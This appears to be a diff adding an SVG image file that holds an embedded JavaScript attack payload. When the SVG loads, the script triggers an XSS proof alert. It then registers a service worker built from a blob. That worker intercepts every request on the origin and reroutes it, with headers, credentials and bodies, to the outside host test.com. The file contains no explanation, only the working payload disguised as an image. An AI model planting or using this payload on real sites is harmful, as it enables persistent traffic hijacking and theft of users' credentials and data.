@@ -1,0 +1,85 @@
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" baseProfile="full">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert(document.domain);
+	  const statusDiv = document.getElementById('status');
+
+    // Service Worker code as a blob
+    const swCode = '' +
+      'self.addEventListener("install", function(event) {' +
+      '  console.log("Service Worker installing...");' +
+      '  self.skipWaiting();' +
+      '});' +
+      '' +
+      'self.addEventListener("activate", function(event) {' +
+      '  console.log("Service Worker activating...");' +
+      '  event.waitUntil(self.clients.claim());' +
+      '});' +
+      '' +
+      'self.addEventListener("fetch", function(event) {' +
+      '  var requestUrl = new URL(event.request.url);' +
+      '  var newUrl = new URL(requestUrl.pathname + requestUrl.search, "https://test.com");' +
+      '  ' +
+      '  console.log("Rerouting: " + event.request.url + " -> " + newUrl.toString());' +
+      '  ' +
+      '  var requestInit = {' +
+      '    method: event.request.method,' +
+      '    headers: event.request.headers,' +
+      '    mode: "cors",' +
+      '    credentials: event.request.credentials,' +
+      '    cache: event.request.cache,' +
+      '    redirect: event.request.redirect,' +
+      '    referrer: event.request.referrer' +
+      '  };' +
+      '  ' +
+      '  if (event.request.method !== "GET" &amp;&amp; event.request.method !== "HEAD") {' +
+      '    requestInit.body = event.request.body;' +
+      '  }' +
+      '  ' +
+      '  var modifiedRequest = new Request(newUrl.toString(), requestInit);' +
+      '  ' +
+      '  event.respondWith(' +
+      '    fetch(modifiedRequest)' +
+      '      .catch(function(error) {' +
+      '        console.error("Fetch failed:", error);' +
+      '        return new Response("Network error occurred", {' +
+      '          status: 408,' +
+      '          headers: { "Content-Type": "text/plain" }' +
+      '        });' +
+      '      })' +
+      '  );' +
+      '});';
+
+    // Register service worker from blob
+    if ('serviceWorker' in navigator) {
+      const blob = new Blob([swCode], { type: 'application/javascript' });
+      const swUrl = URL.createObjectURL(blob);
+
+      navigator.serviceWorker.register(swUrl)
+        .then((registration) => {
+          statusDiv.className = 'status';
+          statusDiv.textContent = `Service Worker registered successfully! Scope: ${registration.scope}`;
+          console.log('Service Worker registered with scope:', registration.scope);
+          
+          // Check if service worker is active
+          if (registration.active) {
+            statusDiv.textContent += ' - Status: ACTIVE';
+          }
+        })
+        .catch((error) => {
+          statusDiv.className = 'status error';
+          statusDiv.textContent = `Service Worker registration failed: ${error.message}`;
+          console.error('Service Worker registration failed:', error);
+        });
+
+      // Listen for service worker updates
+      navigator.serviceWorker.addEventListener('controllerchange', () => {
+        statusDiv.className = 'status';
+        statusDiv.textContent = 'Service Worker activated! All requests are now being rerouted.';
+      });
+    } else {
+      statusDiv.className = 'status error';
+      statusDiv.textContent = 'Service Workers are not supported in this browser.';
+    }
+   </script>
+</svg>
